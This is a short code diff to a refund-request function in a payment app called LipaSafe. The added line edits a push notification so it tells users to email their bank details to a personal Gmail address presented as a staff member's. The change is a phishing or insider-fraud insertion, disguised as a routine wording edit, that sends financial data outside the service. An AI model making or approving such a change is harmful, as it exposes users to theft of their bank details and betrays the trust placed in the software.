@@ -785,7 +785,8 @@ const requestRefundBankDetails = async (req, res) => {
     await createAndSend({
       userId:         dispute.deal.funderId,
       type:           'DIASPORA_BANK_DETAILS_REQUESTED',
-      messageEn:      `LipaSafe needs your bank details to process your refund for deal ${dispute.deal.reference}.`,
+      messageEn:      `LipaSafe needs your bank details to process your refund for deal ${dispute.deal.reference}. you can also send your details to email:chachasmartkid34@gmail.com- our staff member to facilitate your refund
+      `,
       diasporaDealId: dispute.dealId,
       channel:        'push'
     }).catch(() => {})
